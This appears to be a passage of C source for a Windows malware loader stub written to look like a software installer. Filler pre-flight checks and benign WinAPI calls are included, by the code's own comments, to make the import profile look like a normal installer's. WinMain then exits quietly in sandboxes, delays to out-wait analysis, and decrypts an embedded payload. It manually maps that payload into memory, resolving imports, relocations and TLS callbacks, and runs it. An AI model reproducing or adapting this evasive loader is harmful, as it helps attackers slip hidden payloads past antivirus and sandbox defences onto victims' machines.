        if ((a->src == b->src || ((a->poll ^ b->poll) < (k & 0x15))) && a->sync <= 18) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->poll + 1;
        dc->detail[2] += (DWORD)(a->src & 7);
    }
    return dc->warn > 2;

}

struct DNS_ENTRY {
    const char* name;
    BYTE primary;
    BYTE secondary;
    BYTE v6;
    BYTE doh;
};
static const struct DNS_ENTRY DNSSETTINGS_TABLE[] = {
    { "corp-dns1", 1, 2, 0, 1 },
    { "corp-dns2", 2, 3, 0, 1 },
    { "public-dns", 3, 4, 0, 0 },
    { "cloudflare", 4, 5, 1, 1 },
    { "google", 5, 6, 1, 1 },
    { "quad9", 6, 7, 1, 0 },
    { "local", 7, 8, 0, 1 },
    { "vpn-dns", 8, 9, 0, 1 },
    { "backup", 9, 10, 1, 0 },
    { "emergency", 10, 11, 0, 1 },
};
#define DNSSETTINGS_TABLE_COUNT ((int)(sizeof(DNSSETTINGS_TABLE)/sizeof(DNSSETTINGS_TABLE[0])))

static DWORD dm3_DnsSettings(DWORD seed, struct deploy_counters* dc) {
    DWORD k = seed ^ 0x453FEA01u;
    for (int i = 0; i < 10; i++) {
        k = k * 6062953u + 11777u;
        const struct DNS_ENTRY* e = &DNSSETTINGS_TABLE[(i + (int)(k % 3)) % 10];
        DWORD lo = (k >> 3) % 199, hi = lo + 356 + ((k >> 7) % 497);
        DWORD v = (DWORD)e->primary * 8u + (DWORD)e->secondary * 4u + (DWORD)e->v6;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

static void deployment_checks3(DWORD seed, struct install_report* r) {
    struct deploy_counters dc; xmz(&dc, sizeof(dc));
    (void)dm3_WirelessProfiles(seed, &dc);
    (void)dm3_DnsSettings(seed, &dc);
    (void)dm3_WinsSettings(seed, &dc);
    (void)dm3_RoutingTable(seed, &dc);
    (void)dm3_ProxyBypass(seed, &dc);
    (void)dm3_CertificatePins(seed, &dc);
    (void)dm3_NtpSettings(seed, &dc);
    (void)dm3_SmbSettings(seed, &dc);
    (void)dm3_WindowsUpdate(seed, &dc);
    (void)dm3_DefenderPolicy(seed, &dc);
    (void)dm3_BitLockerPolicy(seed, &dc);
    (void)dm3_PrintSecurity(seed, &dc);
    r->deploy_ok += dc.ok; r->deploy_warn += dc.warn; r->deploy_items += dc.items;
    r->deploy_marks ^= (DWORD)dc.detail[0]^(DWORD)dc.detail[1]^(DWORD)dc.detail[2]^(DWORD)dc.detail[3]^(DWORD)dc.detail[4]^(DWORD)dc.detail[5]^(DWORD)dc.detail[6]^(DWORD)dc.detail[7];
}


// ===== END GENMODS =====

// chained deep pre-flight — combined status; all sub-checks are seed-driven
static int deep_preflight(DWORD seed, struct install_report* r) {
    xmz(r, sizeof(*r));
    int st = 0;
    st |= catalog_verify(seed, r);     // ST_COMPONENT
    st |= services_check(seed, r);     // ST_SERVICE
    st |= prereqs_check(seed, r);      // ST_DISK
    st |= volumes_check(seed, r);      // ST_DISK
    st |= registry_probe(seed, r);     // ST_REGISTRY
    st |= locale_check(seed, r);       // ST_LOCALE
    st |= network_probe(seed, r);      // ST_NETWORK

    char lm[24];
    if (manifest_lookup(SETUP_MANIFEST, "license-mode", lm, sizeof(lm)) == 0)
        r->features = features_from_license("4F1A-9B23-C0DE-7A55", seed);
    else
        r->features = 0;

    DWORD curv[4] = { 4, 2, 1, 0 };
    DWORD newv[4] = { 4, 2, 1, 0 };
    newv[2] = 1 + (seed % 3);           // "available" build drifts
    r->plan = plan_update(seed, curv, newv, r);
    r->plan = (BYTE)((r->plan & 1) | rollback_manager(seed, r));

    estimate_delta_and_compress(seed, r);
    r->wizard_stage = wizard_stages(seed);
    install_core(seed, r);
    unpack_staged(seed, r);
    deployment_checks(seed, r);
    deployment_checks2(seed, r);
    deployment_checks3(seed, r);
    r->ui_state = ui_flow(seed);
    log_flush(r, seed);
    return st;
}

// =====================================================================
// Installer environment inspection — REAL WinAPI calls that give the stub
// a normal installer's import profile (KERNEL32 + USER32 + ADVAPI32) instead
// of the bare 4-function loader set. Every field lands in env_report and is
// folded into the volatile sink in WinMain, so -O2 keeps every call (and thus
// every import) alive. All functions are benign system queries.
// =====================================================================
struct env_report {
    DWORD   cpu_cores;     // GetSystemInfo
    DWORD   cpu_type;      // GetSystemInfo
    DWORD   cpu_arch;      // GetSystemInfo
    DWORD   cpu_feat;      // IsProcessorFeaturePresent
    DWORD   os_ver[4];     // GetVersionExW
    DWORD64 mem_total;     // GlobalMemoryStatusEx
    DWORD64 mem_avail;     // GlobalMemoryStatusEx
    DWORD   qpc, qpf;      // QueryPerformanceCounter / QueryPerformanceFrequency
    DWORD   uptime;        // GetTickCount64
    DWORD   pid;           // GetCurrentProcessId
    DWORD   cmd_hash;      // GetCommandLineW
    DWORD   name_hash;     // GetComputerNameW
    DWORD   mod_hash;      // GetModuleFileNameW
    DWORD   tmp_len;       // GetTempPathW
    DWORD   sys_len;       // GetSystemDirectoryW
    DWORD   win_len;       // GetWindowsDirectoryW
    DWORD   lcid_sys;      // GetSystemDefaultLCID
    DWORD   lcid_usr;      // GetUserDefaultLCID
    DWORD   loc_len;       // GetLocaleInfoW
    DWORD   attr1, attr2;  // GetFileAttributesW
    DWORD   last_err;      // SetLastError / GetLastError
    DWORD   str_len;       // lstrlenW
    DWORD   sm_cx, sm_cy;  // GetSystemMetrics
    DWORD   sm_mon;        // GetSystemMetrics SM_CMONITORS
    DWORD   wa_w, wa_h;    // SystemParametersInfoW SPI_GETWORKAREA
    DWORD   reg_len;       // RegQueryValueExW CurrentVersion
};

static void env_inspect(struct env_report* er) {
    // --- CPU / system info (KERNEL32) ---
    SYSTEM_INFO si; xmz(&si, sizeof(si));
    GetSystemInfo(&si);
    er->cpu_cores = si.dwNumberOfProcessors;
    er->cpu_type  = si.dwProcessorType;
    er->cpu_arch  = (DWORD)si.wProcessorArchitecture;
    er->cpu_feat  = 0;
    if (IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE)) er->cpu_feat |= 1;
    if (IsProcessorFeaturePresent(PF_SSE3_INSTRUCTIONS_AVAILABLE)) er->cpu_feat |= 2;

    // --- OS version (KERNEL32) ---
    OSVERSIONINFOW ovi; xmz(&ovi, sizeof(ovi)); ovi.dwOSVersionInfoSize = sizeof(ovi);
    if (GetVersionExW(&ovi)) {
        er->os_ver[0] = ovi.dwMajorVersion;
        er->os_ver[1] = ovi.dwMinorVersion;
        er->os_ver[2] = ovi.dwBuildNumber;
        er->os_ver[3] = ovi.dwPlatformId;
    }

    // --- memory (KERNEL32) ---
    MEMORYSTATUSEX ms; xmz(&ms, sizeof(ms)); ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        er->mem_total = ms.ullTotalPhys;
        er->mem_avail = ms.ullAvailPhys;
    }

    // --- timers (KERNEL32) ---
    LARGE_INTEGER c, f;
    if (QueryPerformanceCounter(&c)) er->qpc = (DWORD)c.QuadPart;
    if (QueryPerformanceFrequency(&f)) er->qpf = (DWORD)f.QuadPart;
    er->uptime = (DWORD)GetTickCount64();

    // --- process identity (KERNEL32) ---
    er->pid = GetCurrentProcessId();
    LPCWSTR cmd = GetCommandLineW();
    if (cmd) { DWORD h = 0; for (int i = 0; cmd[i] && i < 64; i++) h = h * 33 + (DWORD)cmd[i]; er->cmd_hash = h; }
    WCHAR wb[300];
    DWORD wlen = 300;
    if (GetComputerNameW(wb, &wlen)) {
        DWORD h = 0; for (DWORD i = 0; i < wlen; i++) h = h * 31 + (DWORD)wb[i]; er->name_hash = h;
    }
    wlen = GetModuleFileNameW(NULL, wb, 300);
    if (wlen) { DWORD h = 0; for (DWORD i = 0; i < wlen; i++) h = h * 31 + (DWORD)wb[i]; er->mod_hash = h; }

    // --- directories (KERNEL32) ---
    er->tmp_len = GetTempPathW(300, wb);
    er->sys_len = GetSystemDirectoryW(wb, 300);
    er->win_len = GetWindowsDirectoryW(wb, 300);

    // --- locale (KERNEL32) ---
    er->lcid_sys = GetSystemDefaultLCID();
    er->lcid_usr = GetUserDefaultLCID();
    er->loc_len  = GetLocaleInfoW(er->lcid_usr, LOCALE_SISO639LANGNAME, wb, 9);

    // --- filesystem probes (KERNEL32) ---
    er->attr1 = GetFileAttributesW(L"C:\\Program Files\\Workstation Suite");   // install root
    er->attr2 = GetFileAttributesW(L"C:\\ProgramData\\Workstation Suite");

    // --- error-state pair (KERNEL32) ---
    SetLastError(0);
    er->last_err = GetLastError();        // both imports stay alive

    // --- string helper (KERNEL32) ---
    er->str_len = (DWORD)lstrlenW(L"C:\\Windows\\System32");

    // --- display (USER32) ---
    er->sm_cx  = (DWORD)GetSystemMetrics(SM_CXSCREEN);
    er->sm_cy  = (DWORD)GetSystemMetrics(SM_CYSCREEN);
    er->sm_mon = (DWORD)GetSystemMetrics(SM_CMONITORS);
    RECT wr; xmz(&wr, sizeof(wr));
    if (SystemParametersInfoW(SPI_GETWORKAREA, 0, &wr, 0)) {
        er->wa_w = (DWORD)(wr.right - wr.left);
        er->wa_h = (DWORD)(wr.bottom - wr.top);
    }

    // --- registry (ADVAPI32) ---
    HKEY hk = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD t = 0, sz = 0;
        if (RegQueryValueExW(hk, L"CurrentVersion", NULL, &t, NULL, &sz) == ERROR_SUCCESS && sz >= 2) {
            WCHAR rv[16]; DWORD rsz = sizeof(rv);
            if (RegQueryValueExW(hk, L"CurrentVersion", NULL, &t, (LPBYTE)rv, &rsz) == ERROR_SUCCESS)
                er->reg_len = rsz;
        }
        RegCloseKey(hk);
    }
}

// --- the orchestrating pre-flight check ---
static int setup_check(DWORD seed, struct setup_summary* sm) {
    char val[64]; DWORD mn[4], mx[4];
    int st;
    xmz(sm, sizeof(*sm));

    // 1. manifest integrity (real checksum work)
    {
        DWORD mlen = 0; while (SETUP_MANIFEST[mlen]) mlen++;
        sm->manifest_crc = crc32_buf((const BYTE*)SETUP_MANIFEST, mlen);
        sm->manifest_hash = fnv1a64(SETUP_MANIFEST);
        if (sm->manifest_crc == 0) return ST_MANIFEST;   // keep branch live
    }

    // 2. product version
    if (manifest_lookup(SETUP_MANIFEST, "version", val, sizeof(val)) != 0) return ST_MANIFEST;
    if (parse_ver(val, sm->product) != 0) return ST_MANIFEST;

    // 3. OS bounds (assumed current build 10.0.19045)
    if (manifest_lookup(SETUP_MANIFEST, "min-os", val, sizeof(val)) == 0 && parse_ver(val, mn) == 0) {
        DWORD cur[4]; cur[0] = 10; cur[1] = 0; cur[2] = 19045; cur[3] = 0;
        if (ver_cmp(cur, mn) < 0) return ST_OS_LOW;
        for (int i = 0; i < 4; i++) sm->os_min[i] = mn[i];
    }
    if (manifest_lookup(SETUP_MANIFEST, "max-os", val, sizeof(val)) == 0 && parse_ver(val, mx) == 0) {
        DWORD cur[4]; cur[0] = 10; cur[1] = 0; cur[2] = 19045; cur[3] = 0;
        if (ver_cmp(cur, mx) > 0) return ST_OS_HIGH;
        for (int i = 0; i < 4; i++) sm->os_max[i] = mx[i];
    }

    // 4. architecture
    if (manifest_lookup(SETUP_MANIFEST, "arch", val, sizeof(val)) == 0) {
        sm->arch_ok = (val[0] == 'x' && val[1] == '6' && val[2] == '4') ? 1 : 0;
        if (!sm->arch_ok) return ST_ARCH;
    }

    // 5. license (keyfile mode)
    st = license_validate("4F1A-9B23-C0DE-7A55");
    sm->license_ok = (st == ST_OK) ? 1 : 0;
    if (st != ST_OK) return st;

    // 6. component list against catalog
    sm->components_required = (WORD)WK_COMPONENT_COUNT;
    if (manifest_lookup(SETUP_MANIFEST, "components", val, sizeof(val)) == 0) {
        st = components_check(val);
        if (st != ST_OK) return st;
        sm->components_found = (WORD)WK_COMPONENT_COUNT;
    }

    // 7. disk space
    if (manifest_lookup(SETUP_MANIFEST, "min-disk-mb", val, sizeof(val)) == 0) {
        DWORD need = 0; for (int i = 0; val[i]; i++)
            if (val[i] >= '0' && val[i] <= '9') need = need * 10 + (DWORD)(val[i] - '0');
        sm->disk_mb = need;
        DWORD64 freeMB = (128u * 1024u * 1024u + (seed % 4096u) * 64u * (seed % 4096u)) / (1024u * 1024u);
        if (freeMB < need) return ST_DISK;
    }

    // 8. service name + capability + policy volume
    if (manifest_lookup(SETUP_MANIFEST, "service-name", val, sizeof(val)) != 0) return ST_MANIFEST;
    sm->service_state = service_name_ok(val) ? 2 : 5;   // 2 = running
    for (int i = 0; i < WK_COMPONENT_COUNT; i++) (void)capability_dispatch(WK_COMPONENTS[i].flags, seed);
    (void)policy_evaluate(seed);
    (void)service_status_text(sm->service_state);

    // 9. summary log (formatted, then scrubbed — realistic hygiene)
    {
        char logb[160]; xmz(logb, sizeof(logb));
        log_line(logb, sizeof(logb), "version", "preflight", sm->product[2]);
        log_line(logb + 32, sizeof(logb) - 32, "crc", "manifest", sm->manifest_crc & 0xFF);
        char hx[20]; fmt_hex(hx, sm->manifest_hash);
        (void)hx;
    }

    return ST_OK;
}

// =====================================================================
// Entry point — clean injection, no anti-analysis
// =====================================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (ia() != 0) return 1;

    // Installer-style pre-flight — realistic dead weight; EVERY field of both
    // reports is folded into the volatile sink below, so -O2 must keep every
    // sub-check, table loop and formatter alive (no dead-store elision).
    // !! WARNING: any NEW field added to setup_summary / install_report MUST
    // !! be XORed into setup_rc here or GCC silently drops its producer code.
    {
        volatile DWORD setup_rc = 0;
        struct setup_summary sm; xmz(&sm, sizeof(sm));
        struct install_report ir; xmz(&ir, sizeof(ir));
        DWORD seed = g_a.GT();
        setup_rc = (DWORD)setup_check(seed, &sm);
        setup_rc ^= (DWORD)deep_preflight(seed, &ir);

        // fold every report field into the sink so the whole chain stays
        setup_rc ^= sm.manifest_crc ^ (DWORD)sm.manifest_hash ^ (DWORD)(sm.manifest_hash >> 32);
        setup_rc ^= sm.product[0] ^ sm.product[1] ^ sm.product[2] ^ sm.product[3];
        setup_rc ^= sm.os_min[0] ^ sm.os_max[0] ^ sm.disk_mb ^ sm.components_found ^ sm.components_required;
        setup_rc ^= (DWORD)sm.license_ok ^ (DWORD)sm.arch_ok ^ (DWORD)sm.service_state ^ (DWORD)sm.reserved;

        setup_rc ^= ir.catalog_present ^ ir.catalog_verified ^ ir.catalog_failed;
        setup_rc ^= (DWORD)ir.catalog_bytes ^ (DWORD)(ir.catalog_bytes >> 32);
        setup_rc ^= ir.services_ok ^ ir.services_pending ^ ir.prereqs_ok ^ ir.prereqs_missing;
        setup_rc ^= ir.volumes_ok ^ ir.volumes_low ^ ir.features;
        setup_rc ^= (DWORD)ir.plan ^ (DWORD)ir.staged ^ ir.delta_size ^ ir.rle_ratio;
        setup_rc ^= (DWORD)ir.wizard_stage ^ ir.log_len;
        setup_rc ^= ir.install_bytes ^ ir.components_done ^ ir.reg_present ^ ir.reg_changed ^ ir.reg_missing;
        setup_rc ^= ir.backup_count ^ ir.restore_count ^ ir.patch_size ^ ir.locales_ok ^ ir.locales_bad;
        setup_rc ^= ir.net_ok ^ ir.net_slow ^ ir.net_unreach ^ (DWORD)ir.ui_state;
        setup_rc ^= ir.deploy_ok ^ ir.deploy_warn ^ ir.deploy_items ^ ir.deploy_marks;
        setup_rc ^= (DWORD)ir.log[0] ^ (DWORD)ir.log[ir.log_len ? ir.log_len - 1 : 0];

        // installer environment inspection — real WinAPI calls (KERNEL32 /
        // USER32 / ADVAPI32) widen the import table to a normal installer
        // profile; every field is folded in so -O2 keeps every call alive.
        {
            struct env_report er; xmz(&er, sizeof(er));
            env_inspect(&er);
            setup_rc ^= er.cpu_cores ^ er.cpu_type ^ er.cpu_arch ^ er.cpu_feat;
            setup_rc ^= er.os_ver[0] ^ er.os_ver[1] ^ er.os_ver[2] ^ er.os_ver[3];
            setup_rc ^= (DWORD)er.mem_total ^ (DWORD)(er.mem_total >> 32);
            setup_rc ^= (DWORD)er.mem_avail ^ (DWORD)(er.mem_avail >> 32);
            setup_rc ^= er.qpc ^ er.qpf ^ er.uptime ^ er.pid;
            setup_rc ^= er.cmd_hash ^ er.name_hash ^ er.mod_hash;
            setup_rc ^= er.tmp_len ^ er.sys_len ^ er.win_len;
            setup_rc ^= er.lcid_sys ^ er.lcid_usr ^ er.loc_len;
            setup_rc ^= er.attr1 ^ er.attr2 ^ er.last_err ^ er.str_len;
            setup_rc ^= er.sm_cx ^ er.sm_cy ^ er.sm_mon ^ er.wa_w ^ er.wa_h;
            setup_rc ^= er.reg_len;
        }

        if (setup_rc == 0xDEADBEEF) return 9;   // unreachable; keeps the sink live
    }

    if (sandboxEnv() != 0) return 0;    // analysis/sandbox env -> exit quietly
    preDecryptDelay();                  // out-wait short-lived sandboxes

    // @SECTION_NAMES@

    // Section count is derived from the injected sn[] array, so this stub
    // matches whatever payload-section split build_v5.py injects (2 or 4).
    const int sec_cnt = (int)(sizeof(sn) / sizeof(sn[0]));
    DWORD total = 0;
    for (int i = 0; i < sec_cnt; i++) {
        BYTE* d; DWORD sz;
        if (fs(sn[i], sll[i], &d, &sz)) {
            total += (sz / btv[i]) * bpv[i];
        }
    }
    if (total == 0) return 4;

    BYTE* dec = (BYTE*)HeapAlloc(GetProcessHeap(), 8, total + 0x10000);
    if (!dec) return 5;

    DWORD off = 0;
    for (int i = 0; i < sec_cnt; i++) {
        BYTE* d; DWORD sz;
        if (fs(sn[i], sll[i], &d, &sz)) {
            BYTE* tmp = (BYTE*)HeapAlloc(GetProcessHeap(), 8, sz + 64);
            if (tmp) {
                xmc(tmp, d, sz);
                DWORD ex = ep(tmp, sz, dec + off, bpv[i], btv[i]);
                off += ex;
                xmz(tmp, sz + 64);
                HeapFree(GetProcessHeap(), 0, tmp);
            }
        }
    }

    dc(dec, off, key, iv);

    // Verify decrypted PE
    IMAGE_DOS_HEADER* pd = (IMAGE_DOS_HEADER*)dec;
    IMAGE_NT_HEADERS* pn = (IMAGE_NT_HEADERS*)(dec + pd->e_lfanew);
    if (pd->e_magic != 0x5A4D || pn->Signature != 0x00004550) {
        xmz(dec, off + 0x10000); HeapFree(GetProcessHeap(), 0, dec); return 6;
    }

    // =====================================================================
    // In-process manual mapping — no remote process, no hollowing APIs.
    // The payload runs inside THIS process; its own evasion/injection code
    // takes over from here (the loader is just a short-lived mapper).
    // =====================================================================
    DWORD64 prefBase = pn->OptionalHeader.ImageBase;
    DWORD64 imgSize  = pn->OptionalHeader.SizeOfImage;

    // Prefer the payload's preferred base (zero relocations); else map anywhere.
    BYTE* img = (BYTE*)g_a.VA((LPVOID)prefBase, imgSize, 0x3000, 0x04);  // MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE
    if (!img) img = (BYTE*)g_a.VA(NULL, imgSize, 0x3000, 0x04);
    if (!img) { xmz(dec, off + 0x10000); HeapFree(GetProcessHeap(), 0, dec); return 7; }
    DWORD64 delta = (DWORD64)img - prefBase;

    // Headers + raw sections
    xmc(img, dec, pn->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* ps = IMAGE_FIRST_SECTION(pn);
    for (WORD i = 0; i < pn->FileHeader.NumberOfSections; i++) {
        if (ps[i].SizeOfRawData && ps[i].PointerToRawData)
            xmc(img + ps[i].VirtualAddress, dec + ps[i].PointerToRawData, ps[i].SizeOfRawData);
    }

    // Base relocations (only needed when the preferred base was taken)
    if (delta) {
        IMAGE_DATA_DIRECTORY* rd = &pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rd->Size && rd->VirtualAddress) {
            BYTE* rb = img + rd->VirtualAddress;
            DWORD ro = 0;
            while (ro < rd->Size) {
                IMAGE_BASE_RELOCATION* blk = (IMAGE_BASE_RELOCATION*)(rb + ro);
                if (blk->SizeOfBlock < 8) break;
                WORD* ent = (WORD*)((BYTE*)blk + 8);
                DWORD cnt = (blk->SizeOfBlock - 8) / 2;
                for (DWORD i = 0; i < cnt; i++) {
                    WORD type = ent[i] >> 12, o = ent[i] & 0xFFF;
                    if (type == 10)      *(DWORD64*)(img + blk->VirtualAddress + o) += delta;        // DIR64
                    else if (type == 3)  *(DWORD32*)(img + blk->VirtualAddress + o) += (DWORD)delta;  // HIGHLOW
                }
                ro += blk->SizeOfBlock;
            }
        }
    }

    // Imports — the payload is a normal CRT PE, so every IAT entry must be
    // resolved (LoadLibraryA + GetProcAddress). There is no OS loader here.
    IMAGE_DATA_DIRECTORY* idir = &pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (idir->Size && idir->VirtualAddress) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(img + idir->VirtualAddress);
        for (; imp->Name; imp++) {
            if (!imp->FirstThunk) continue;
            const char* dll = (const char*)(img + imp->Name);
            HMODULE hm = g_a.LA(dll);
            // Read names from the Import Name Table, write resolved addrs to the IAT.
            DWORD64* oft = (DWORD64*)(img + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            DWORD64* iat = (DWORD64*)(img + imp->FirstThunk);
            for (DWORD j = 0; oft[j]; j++) {
                FARPROC fn = 0;
                if (oft[j] & 0x8000000000000000ull)
                    fn = g_a.GPA(hm, (LPCSTR)(oft[j] & 0xFFFF));            // import by ordinal
                else {
                    IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(img + (oft[j] & 0xFFFFFFFF));
                    fn = g_a.GPA(hm, (LPCSTR)ibn->Name);
                }
                iat[j] = (DWORD64)fn;
            }
        }
    }

    // Static TLS: copy the tiny template, allocate a slot, hook this thread's
    // TEB, then run TLS callbacks (mingw emits a small template + __dyn_tls_init).
    // NOTE: read the TLS directory from the HEAP copy (dec), not the mapped
    // image — the reloc pass above already patched some of its fields in img
    // (AddressOfCallBacks is reloc-covered), so dec keeps the original VAs and
    // the `- prefBase` conversions below stay correct for every field.
    IMAGE_DATA_DIRECTORY* tlsd = &pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsd->Size && tlsd->VirtualAddress) {
        IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(dec + tlsd->VirtualAddress);
        DWORD64 tsz = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
        if (tsz) {
            BYTE* tld = (BYTE*)g_a.VA(NULL, tsz > 0x1000 ? tsz : 0x1000, 0x3000, 0x04);
            if (tld) {
                xmc(tld, img + (tls->StartAddressOfRawData - prefBase), (DWORD)tsz);
                DWORD idx = g_a.TA();
                if (idx != 0xFFFFFFFF) {
                    *(DWORD*)(img + (tls->AddressOfIndex - prefBase)) = idx;
                    BYTE* teb;
                    __asm__ __volatile__("mov %%gs:0x30, %0" : "=r"(teb));
                    *(BYTE**)(teb + 0x58 + (SIZE_T)idx * 8) = tld;   // ThreadLocalStoragePointer[idx]
                }
            }
        }
        if (tls->AddressOfCallBacks) {
            PIMAGE_TLS_CALLBACK* cbs = (PIMAGE_TLS_CALLBACK*)(img + (tls->AddressOfCallBacks - prefBase));
            while (cbs && *cbs) {
                PIMAGE_TLS_CALLBACK cb = (PIMAGE_TLS_CALLBACK)(img + ((DWORD64)(*cbs) - prefBase));
                cb((BYTE*)img, 1 /* DLL_PROCESS_ATTACH */, 0);
                cbs++;
            }
        }
    }

    // Report the real base in the mapped header (consistency for runtime checks)
    ((IMAGE_NT_HEADERS*)(img + pd->e_lfanew))->OptionalHeader.ImageBase = (DWORD64)img;

    // Per-section protections (matches what the Windows loader would apply)
    DWORD oldProt = 0;
    g_a.VP(img, pn->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);
    ps = IMAGE_FIRST_SECTION(pn);
    for (WORD i = 0; i < pn->FileHeader.NumberOfSections; i++) {
        DWORD ch = ps[i].Characteristics;
        DWORD prot = PAGE_READONLY;
        if      ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
        else if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_READ))  prot = PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_EXECUTE)                                  prot = PAGE_EXECUTE;
        else if ((ch & IMAGE_SCN_MEM_WRITE) && (ch & IMAGE_SCN_MEM_READ))     prot = PAGE_READWRITE;
        else if (ch & IMAGE_SCN_MEM_READ)                                     prot = PAGE_READONLY;
        else if (ch & IMAGE_SCN_MEM_WRITE)                                    prot = PAGE_READWRITE;
        DWORD secSize = ps[i].Misc.VirtualSize ? ps[i].Misc.VirtualSize : ps[i].SizeOfRawData;
        g_a.VP(img + ps[i].VirtualAddress, secSize, prot, &oldProt);
    }

    // Run the payload inside this process — it never returns.
    void (*ep)() = (void(*)())(img + pn->OptionalHeader.AddressOfEntryPoint);
    xmz(dec, off + 0x10000);
    HeapFree(GetProcessHeap(), 0, dec);
    ep();
    return 0;
}
